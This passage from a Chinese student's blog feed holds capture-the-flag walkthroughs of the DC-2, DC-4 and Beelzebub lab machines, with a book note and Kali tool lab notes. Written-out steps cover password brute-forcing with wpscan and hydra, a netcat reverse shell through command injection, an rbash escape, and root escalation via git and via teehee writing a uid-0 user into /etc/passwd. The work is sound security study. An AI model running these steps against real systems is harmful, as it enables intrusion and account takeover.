<p>这里用到枚举功能 发现有3个用户名 分别是<strong>admin jerry tom</strong></p>
<p><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/5.jpg" alt="5"></p>
<p>我们生成一个用户名表 把这仨放进去 方便后面爆破<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/6.jpg" alt="6"><br>密码方面遵从flag的提示 使用cwel工具<br><code>cwel [网址]  -w [生成文件名]</code><br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>随后用户名表有了 密码表也有了 我们用wpscan来爆破一下<br><code>wpscan --url [网址] -U [用户名表] -P [密码表] </code><br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/8.jpg" alt="8"></p>
<p>找出了tom与jerry的密码<br>我们进入登陆页面 发现jerry账号处有flag<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/9.jpg" alt="9"><br>[大意：换个捷径 也就是另一个入口试试看吧]<br>那么我们就能想到刚刚开放的7744端口对应了ssh服务 尝试登陆<br>发现用刚才爆破出的tom账号密码可以登陆<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/10.jpg" alt="10"><br>登陆后发现tom用户无法执行系统指令 用户默认shell为rbash </p>
<pre class="line-numbers language-none"><code class="language-none">绕过bash限制(这里基本看不懂就把原教程贴上来吧嘻嘻)
BASH_CMDS[a]=/bin/sh
a/bin/bashexport
PATH=$PATH:/binexport 
PATH=$PAH:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在执行了绕过后 通过查看文件发现flag3<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/11.jpg" alt="11"><br>[大意：可怜的老tom老追着jerry跑 也许需要su一下？]<br>我们su jerry来切换用户<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/12.jpg" alt="12"><br>切换之后就找到了flag4<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/13.jpg" alt="13"><br>[大意：最后一个flag才算数哦 用git逃出这里吧]<br>jerry的权限不足以访问/root 看来是需要git 提权了</p>
<blockquote>
<p>参考:<a href="https://blog.csdn.net/qq_38612882/article/details/122772867">csdn-2022-渗透测试-git提权（Linux）</a></p>
<pre class="line-numbers language-none"><code class="language-none">sudo git help config
	!/bin/bash或者！'sh'完成提权<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</blockquote>
<p>这样操作完之后就能访问root了<br><img data-src="/2023/12/22/DC-2%E8%A7%A3%E6%9E%90/14.jpg" alt="14"><br>完事！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>dc这个系列的靶机好像就是每期针对一个不同类型的博客框架进行拆解啊<br>wordpress之前接触过所以还算好说<br><em><strong>那我们下次见吧</strong></em></p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记-如何阅读一本书</title>
    <url>/2023/12/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p>经<a href="https://truthleader.github.io/"><del>我们伟大而全能的唯一至高真理教教主</del></a>推荐而读<br>本书下载地址：<a href="https://zh.z-library.se/book/5423134/5e4d46/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6.html">点击这里</a></p>
<hr>
<p>ps:之前没做过这种东西 所以姑且先开一篇试试水<br>这玩意多半得长期更新 边摸边写</p>
<h2 id="总之为啥要看呢？"><a href="#总之为啥要看呢？" class="headerlink" title="总之为啥要看呢？"></a>总之为啥要看呢？</h2><p>1.提升看书的效率（用更少的时间来阅读更多的内容）云云<br>2.很好奇是怎么个”如何阅读”</p>
<h2 id="我目前看出来个啥"><a href="#我目前看出来个啥" class="headerlink" title="我目前看出来个啥"></a>我目前看出来个啥</h2><span id="more"></span>
<p>1.有的时候 <strong>理解（understand）</strong>东西并不需要<strong>知道（know）</strong>这件事相关的所有事物。太多的资讯与太少的资讯都会成为理解力的阻碍。</p>
<p>2.阅读并不是完全被动(类似于被打了一拳，或得到一项遗产，或法院的判决)的行为。反倒更像是棒球比赛中的捕手——读者需要去尽可能接收作者所投出来的“球”，把自己的技巧与作者的技巧融合起来，达到共同的终点。读者想“接住”多少意念完全看他在阅读时多么主动，以及他投⼊不同⼼思来阅读的技巧如何。</p>
<ol start="3">
<li></li>
</ol>
</body></html>]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4解析</title>
    <url>/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这个是学校作业哦<br>下载地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p>
<hr>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机：kali<br>靶机：DC-4<br>网络链接均为Nat模式</p>
<h2 id="相关知识与工具"><a href="#相关知识与工具" class="headerlink" title="相关知识与工具"></a>相关知识与工具</h2><p>burpsuite （爆破 监听 数据包更改）<br>hydra（爆破用工具）<br>teehee提权</p>
<span id="more"></span>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>照例<br><code>arp-scan -l //发现同网段设备</code><br><code>nmap -p- -A [指定的ip地址] //扫描开放的端口并套用脚本</code><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>既然开放了80端口 那就访问看看<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>是个登陆页面 说是<strong>admin</strong>信息系统登陆<br>我们用burpsuite爆破密码试试<br>调整firefox与burpsuite的proxy设定 我们开启监听 <strong>send to intruder</strong><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br>用攻击类型Cluster bomb来爆破 字典选择kali中自带的/usr/share/john/password.lst</p>
<blockquote>
<p>坑:本来想用rockyou.txt的 行数太多常常导致burpsuite的崩溃</p>
</blockquote>
<p>注意该lst文件前面会有几行注释 选中后点击左边的remove即可<br>因为使用的是Cluster bomb需要给两个<strong>payload</strong>都加上内容<br>我们切换<strong>payload set</strong>继续导入词库<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/4.jpg" alt="4"><br>ok了 点击右上角按钮开始攻击<br>嫌速度慢的可以在Resource pool中更改线程<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/5.jpg" alt="5"><br>经过极其漫长的等待<br>结果出来了<br>账号名为<strong>admin</strong> 密码为<strong>happy</strong><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/6.jpg" alt="6"><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>我们用这套账号密码登陆进入网站<br>网站里面有一些命令可以执行 但都是固定的<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/8.jpg" alt="8"><br>我们用burpsuite抓包 尝试修改命令<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/9.jpg" alt="9"><br>我们把命令改成<strong>ipconfig</strong><br>可以看到照样成功运行了<br>既然运行命令可行 那就利用nc(瑞士军刀)反弹shell吧<br>在kali端运行<code>nc -lnvp 1234 //于1234端口开始监听</code><br>在burpsuite中将命令改为<code>nc [kali的ip地址] [端口] -e /bin/sh //反弹shell</code><br>点击send 成功反弹<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/10.jpg" alt="10"><br>利用<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>优化交互页面<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/11.jpg" alt="11"><br>在根目录的home目录下使用<code>ls -alR</code>递归显示所有目录与隐藏文件<br>在jim目录底下发现名为old-passwords.bak的文件<br>联系一开始端口扫描中开放的22端口<br>我们需要尝试登陆ssh服务<br>至于如何把该文件中的内容传回来 直接复制粘贴即可<br>账号名为<strong>jim</strong> 密码目录使用复制粘贴的密码目录<br>工具为hydra<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/12.jpg" alt="12"><br><code>hydra -l [用户名] -P [密码字典目录] [服务名：//ip地址]</code><br>我们稍等片刻 结果出来了<br><code>[22][ssh] host: 192.168.246.142   login: jim   password: jibril04</code><br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/13.jpg" alt="13"><br>登陆完毕 嘻嘻<br>一进来系统就说<strong>you have mail</strong><br>那我们找找这封邮件在哪里</p>
<pre class="line-numbers language-none"><code class="language-none">find [寻找范围] -name [想找的文件名称] 2&gt;/dev/null
2&gt;/dev/null 不输出报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/14.jpg" alt="14"><br>发现在**/var/mail**目录里边有一封信件<br>(大意:jim 我这周要去休假 老板叫我给你我的密码 免得有要紧事 拜拜）<br>有了charles的账号密码 我们切换一下账号<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/15.jpg" alt="15"><br>成功进入 我们sudo -l查看该用户的sudo权限<br>发现他可以以root权限免密码执行 /usr/bin/teehee<br>那就通过teehee提权的方式来获取权限</p>
<blockquote>
<p>参考：<a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee提权</a><br>teehee是个小众的linux编辑器 如果有sudo权限 可以利用其来提权<br>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p>
<pre class="line-numbers language-none"><code class="language-none">echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su admin就可以登录到admin用户，这个用户因为uid为0，所以也是root权限</p>
</blockquote>
<p>我们安装教程 输入<code>echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</code><br>随后便能不使用密码<strong>su admin</strong><br>flag自然在/root目录之下<br><img data-src="/2023/12/29/DC-4%E8%A7%A3%E6%9E%90/16.jpg" alt="16"><br>成功！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>知识点比较少 短小精悍的靶机<br>那我们下次再见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>每周靶机之Beelzebub</title>
    <url>/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这个是工作室的靶机</p>
<h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：beelzebub</p>
<h2 id="知识点和工具"><a href="#知识点和工具" class="headerlink" title="知识点和工具"></a>知识点和工具</h2><p>wpscan (wordpress环境专用的工具 用于爆破用户名或密码)<br>dirsearch (目录扫描)<br>md5加密<br>目录扫描</p>
<h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><span id="more"></span> 
<p>老样子 发现靶机 扫描端口<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/1.jpg" alt="1"><br>80端口开着 我们访问看两眼<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/2.jpg" alt="2"><br>标准的默认欢迎页面 没什么特别的<br>用扫描目录的工具<strong>dirsearch</strong>找找有没有其他目录<br><code>dirsearch -u [网址]</code><br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/3.jpg" alt="3"><br>在index.php网站内发现隐藏注释<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/4.jpg" alt="4"><br>（大意:我的核心被加密了，”beelzebub”不知为何破解并加密了他 -MD5)<br>说明我们要去的目录与md5加密后的”beelzebub”有联系<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/5.jpg" alt="5"><br>于是我们随便找个<strong>md5加密/解密</strong>网站将beelzebub加密<br>逐一用dirsearch来寻找正确的目录<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/6.jpg" alt="6"><br>最终发现在32位小写加密方式的目录下存在wordpress基站<br>依次查看 发现wp-content/uploads/下存在文件管理系统<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/12.jpg" alt="12"><br>进入Talk To VALAK中<br>发现在输入任何字段后网页会返回一段名为password的cookie<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/7.jpg" alt="7"><br>该密码多半与开放的ssh服务有联系 但用户名未知<br>我们使用wpscan来爆破该网站的用户名</p>
<pre class="line-numbers language-none"><code class="language-none">wpscan -url "[网址]" -e u --ignore-main-redirect --force
-url //指定网址
-e u //爆破用户名
--ignore-main-redirect //忽略主要的重定向
--force //强制执行扫描（这在你确信目标站点是WordPress站点但WPScan未正确检测到的情况下可能会有用）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/8.jpg" alt="8"><br>结果显示有俩用户 分别为<strong>krampus</strong>与<strong>valak</strong><br>经过尝试发现可以使用password中的密码与<strong>krampus</strong>登陆ssh服务<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/9.jpg" alt="9"><br>进去后发现权限不够 需要提权<br>查看<strong>history //历史记录</strong>后发现该账号曾尝试提权<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/10.jpg" alt="10"><br>我们复现过程即可<br><img data-src="/2023/12/31/%E6%AF%8F%E5%91%A8%E9%9D%B6%E6%9C%BA%E4%B9%8BBeelzebub/11.jpg" alt="11"><br>获得root权限 结束！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>过程很短的靶机<br>结合了wordpress与目录扫描<br>已经不止一次见到wordpress了 用wpscan便可以解决大部分的问题<br><strong>那么我们下次见</strong></p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>学校实训-笔记</title>
    <url>/2024/01/08/%E5%AD%A6%E6%A0%A1%E5%AE%9E%E8%AE%AD-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>学校寒假放了点作业出来<br>做个笔记</p>
<span id="more"></span>
<h1 id="实验-1-配置Kali"><a href="#实验-1-配置Kali" class="headerlink" title="实验 1 配置Kali"></a>实验 1 配置Kali</h1><p><strong>实验场景</strong><br>小明是网络工程师，某天他收到上级领导命令，需要在网络中部署一台Kali服务器，为…</p>
<p><strong>实验环境</strong><br>Kali 2016</p>
<p><strong>实验工具</strong><br>无</p>
<p><strong>实验目的</strong><br>对Kali进行网络配置，修改主机名和root密码，修改源配置文件并进行系统更新</p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1-修改主机名"><a href="#1-修改主机名" class="headerlink" title="1. 修改主机名"></a>1. 修改主机名</h3><ul>
<li>临时修改主机名，重启会还原</li>
<li>永久修改主机名，需要重启才能生效</li>
<li>修改 <code>/etc/hosts</code> 配置文件</li>
</ul>
<h3 id="2-配置Kali的网络"><a href="#2-配置Kali的网络" class="headerlink" title="2. 配置Kali的网络"></a>2. 配置Kali的网络</h3><ul>
<li>修改本机的网卡设置，设置为dhcp获取IP方式，也可以设置成静态IP，需要给网卡配置IP地址<pre class="line-numbers language-none"><code class="language-none">vi /etc/network/interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h3 id="3-查看当前用户是否是root，修改root密码"><a href="#3-查看当前用户是否是root，修改root密码" class="headerlink" title="3. 查看当前用户是否是root，修改root密码"></a>3. 查看当前用户是否是root，修改root密码</h3><h3 id="4-修改Kali的源配置文件，添加国内的源，并进行系统升级"><a href="#4-修改Kali的源配置文件，添加国内的源，并进行系统升级" class="headerlink" title="4. 修改Kali的源配置文件，添加国内的源，并进行系统升级"></a>4. 修改Kali的源配置文件，添加国内的源，并进行系统升级</h3><ul>
<li>添加中科大的源<pre class="line-numbers language-none"><code class="language-none">vi /etc/apt/sources.list
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
<li>执行更新指令<pre class="line-numbers language-none"><code class="language-none">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
等待更新完成</li>
</ul>
<p><strong>实验总结</strong><br>Kali版本众多，最新版本中会添加一些最新的工具和软件，需要持续进行更新。</p>
<h1 id="实验-2-Web应用程序-Dirb"><a href="#实验-2-Web应用程序-Dirb" class="headerlink" title="实验 2 Web应用程序-Dirb"></a>实验 2 Web应用程序-Dirb</h1><p><strong>实验场景</strong><br>小明是网络工程师，某天他收到上级领导命令，需要在Kali服务器使用Dirb软件，为…</p>
<p><strong>实验环境</strong><br>攻击机Kali 2018<br>靶机Windows 7 192.168.163.</p>
<p><strong>实验工具</strong><br>Dirb</p>
<p><strong>实验目的</strong><br>了解并掌握Dirb对网站进行扫描</p>
<h2 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>DIRB是一个Web内容扫描。它看起来对现有（和/或隐藏）的Web对象。它主要的工作原理是发动了对Web服务器的基于字典的攻击和分析的响应。</p>
<p>DIRB带有易于使用的一组预配置的攻击生词，但你可以用你自定义的词表。此外DIRB有时可以作为一个典型的CGI扫描器，但要记住是一个内容扫描仪没有漏洞扫描器。</p>
<p>DIRB主要目的是在专业的Web应用程序的审核帮助。特别是在与安全相关的测试。它没有涵盖的经典网页漏洞扫描器一些漏洞。 DIRB寻找其他通用CGI扫描器无法查找特定的Web对象。它不搜索的漏洞，也没有寻找网页内容，可以vulnerables。</p>
<p>直接在终端启动软件</p>
<pre class="line-numbers language-none"><code class="language-none">dirb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>扫描Web服务器（<a href="http://192.168.163.147:88/%EF%BC%89%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E5%AD%97%E5%85%B8%E6%96%87%E4%BB%B6">http://192.168.163.147:88/）利用系统自带字典文件</a><br>（/usr/share/wordlists/dirb/common.txt）</p>
<pre class="line-numbers language-none"><code class="language-none">dirb http://192.168.163.147:88/ /usr/share/wordlists/dirb/common.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用自备字典进行扫描</p>
<pre class="line-numbers language-none"><code class="language-none">dirb http://192.168.163.147:88 /root/test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>实验总结</strong><br>掌握使用Dirb对Web进行扫描，查看软件的扫描报告文件</p>
<h1 id="实验-3-报告工具-pipal"><a href="#实验-3-报告工具-pipal" class="headerlink" title="实验 3 报告工具-pipal"></a>实验 3 报告工具-pipal</h1><p><strong>实验场景</strong><br>小明是网络工程师，某天他收到上级领导命令，需要在Kali服务器使用pipal工具，为…</p>
<p><strong>实验环境</strong><br>Kali 2018</p>
<p><strong>实验工具</strong><br>Pipal</p>
<p><strong>实验目的</strong><br>掌握密码分析工具pipal的使用方法</p>
<h2 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>所有这些工具确实是给你的统计数据和信息，以帮助您分析密码。真正的工作是由你解释的结果进行。</p>
<p>查看帮助</p>
<pre class="line-numbers language-none"><code class="language-none">pipal –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>分析本地password.txt文件，可以分析密码文件的词频等信息</p>
<pre class="line-numbers language-none"><code class="language-none">pipal /root/password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>分析并显示前 5 个密码（-t 5），使用给定文件作为输入（/usr/share/wordlists/nmap.lst）：</p>
<pre class="line-numbers language-none"><code class="language-none">pipal –t 5 /usr/share/wordlists/nmap.lst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>实验总结</strong><br>pipal是一款词频分析工具，可以用来在字典中筛选出出现频率高的密码</p>
<h1 id="实验-4-漏洞分析-unix-privesc-check"><a href="#实验-4-漏洞分析-unix-privesc-check" class="headerlink" title="实验 4 漏洞分析-unix-privesc-check"></a>实验 4 漏洞分析-unix-privesc-check</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用unix-privesc-check，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2016</p>
<p><strong>实验工具</strong></p>
<p>unix-privesc-check</p>
<p><strong>实验目的</strong></p>
<p>了解unix-privesc-check工具的使用</p>
<p><strong>实验步骤</strong></p>
<h2 id="1-查看帮助"><a href="#1-查看帮助" class="headerlink" title="1. 查看帮助"></a>1. 查看帮助</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unix-privesc-check -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><code>standard</code> ：标准”模式：速度优化检查大量的安全设置。</li>
<li><code>detailed</code> ：“详细”模式：与标准模式相同，但也检查打开文件的perms句柄和被调用的文件（例如从shell脚本分析，链接的.so文件）。 这种模式很慢。</li>
</ul>
<h2 id="2-使用标准模式扫描本地"><a href="#2-使用标准模式扫描本地" class="headerlink" title="2. 使用标准模式扫描本地"></a>2. 使用标准模式扫描本地</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unix-privesc-check standard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3-把报告保存到本地文件"><a href="#3-把报告保存到本地文件" class="headerlink" title="3. 把报告保存到本地文件"></a>3. 把报告保存到本地文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unix-privesc-check &gt; baogao.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="4-查看报告"><a href="#4-查看报告" class="headerlink" title="4. 查看报告"></a>4. 查看报告</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat baogao.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>实验总结</strong></p>
<p>unix-privesc-check是Kali Linux自带的一款提权漏洞检测工具。它是一个Shell文件，可以检测所在系统的错误配置，以发现可以用于提权的漏洞。</p>
<h1 id="实验5-kali-漏洞扫描-lynis"><a href="#实验5-kali-漏洞扫描-lynis" class="headerlink" title="实验5 kali-漏洞扫描-lynis"></a>实验5 kali-漏洞扫描-lynis</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用lynis工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>kali 2018</p>
<p><strong>实验工具</strong></p>
<p>lynis</p>
<p><strong>实验目的</strong></p>
<p>了解漏洞扫描工具lynis的使用</p>
<p><strong>实验步骤</strong></p>
<h2 id="1-启动lynis并列出支持的参数"><a href="#1-启动lynis并列出支持的参数" class="headerlink" title="1. 启动lynis并列出支持的参数"></a>1. 启动lynis并列出支持的参数</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lynis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2-对本地进行安全扫描"><a href="#2-对本地进行安全扫描" class="headerlink" title="2. 对本地进行安全扫描"></a>2. 对本地进行安全扫描</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lynis audit system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3-查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）"><a href="#3-查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）" class="headerlink" title="3. 查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）"></a>3. 查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）</h2><p>日志保存在/var/log/lynis-report.dat</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">grep –E “^warning|^suggestion” /var/log/lynis-report.dat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="4-检查更新"><a href="#4-检查更新" class="headerlink" title="4. 检查更新"></a>4. 检查更新</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lynis update info --no-colors<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="5-创建Lynis计划任务"><a href="#5-创建Lynis计划任务" class="headerlink" title="5. 创建Lynis计划任务"></a>5. 创建Lynis计划任务</h2><p>如果你想为你的系统创建一个日扫描报告，你可以设置cron：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crontab -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>添加cron任务：</p>
<p><strong>实验总结</strong></p>
<p>观察lynis工具能否扫描出系统存在的漏洞，如果存在该如何进行加固</p>
<h1 id="实验6-kali-漏洞扫描-WPScan"><a href="#实验6-kali-漏洞扫描-WPScan" class="headerlink" title="实验6 kali-漏洞扫描-WPScan"></a>实验6 kali-漏洞扫描-WPScan</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用pipal工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机 kali 2018<br>靶机 windows 7 192.168.163.</p>
<p><strong>实验工具</strong></p>
<p>攻击机：wpscan<br>靶机：wordpress</p>
<p><strong>实验目的</strong></p>
<p>了解wpscan的使用</p>
<p><strong>实验步骤</strong></p>
<h2 id="1-简单的攻击"><a href="#1-简单的攻击" class="headerlink" title="1. 简单的攻击"></a>1. 简单的攻击</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan –u 192.168.163.147/wordpress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2-列出用户名列表"><a href="#2-列出用户名列表" class="headerlink" title="2. 列出用户名列表"></a>2. 列出用户名列表</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan –u 192.168.163.147/wordpress –e u vp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3-通过字典爆破用户密码"><a href="#3-通过字典爆破用户密码" class="headerlink" title="3. 通过字典爆破用户密码"></a>3. 通过字典爆破用户密码</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan –u 192.168.163.147/wordpress –e u –wordlist /root/password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="4-了解其它参数"><a href="#4-了解其它参数" class="headerlink" title="4. 了解其它参数"></a>4. 了解其它参数</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan – h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>实验总结</strong></p>
<p>思考WPScan的作用场景是否有特定版本号要求</p>
<h1 id="实验-7-密码攻击-cewl"><a href="#实验-7-密码攻击-cewl" class="headerlink" title="实验 7 密码攻击-cewl"></a>实验 7 密码攻击-cewl</h1><p><strong>实验场景</strong></p>
